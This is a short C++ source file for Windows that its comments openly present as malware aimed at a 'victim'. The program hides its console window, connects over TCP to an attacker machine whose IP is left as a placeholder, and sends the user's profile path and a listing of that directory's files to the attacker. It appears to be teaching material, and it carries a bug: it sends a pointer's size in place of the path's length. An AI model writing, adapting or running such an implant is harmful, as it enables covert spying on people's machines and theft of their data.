#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib") // allows us to use sockets (networking) functionality in Windows
#include <iostream> //standard input/output utilities
#include <winsock2.h> // networking utilities
#include <dirent.h> // directory utilities
#include <string> // string utilities
#include <stdio.h> // standard input/output utilities
#include <stdlib.h> // standard input/output utilities


// get the value of %USERPROFILE% environment variable
char* userDirectory() {
    char* pPath;
    pPath = getenv("USERPROFILE");

    if (pPath!=NULL) {
        return pPath;
    }
    else {
        perror("");
    }
}


int main() {
    // hide the program window so that it's not obvious to the victim 
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    // Set up a TCP socket
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("place the IP address of the attacker machine here");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    // get the user directory
    char* pPath = userDirectory();

    // send the user directory path to the attacker
    send(server, pPath, sizeof(pPath), 0);
    send(server, "\n", 1, 0);

    // open the user's directory and then read the entries in it
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(pPath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            send(server, ent->d_name, sizeof(ent->d_name), 0);
            send(server, "\n", 1, 0);
	    // zero out the directory name
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
    }
    else {
        perror("");
    }

    // close the socket
    closesocket(server);

    // clean up the Winsock library components
    WSACleanup();
}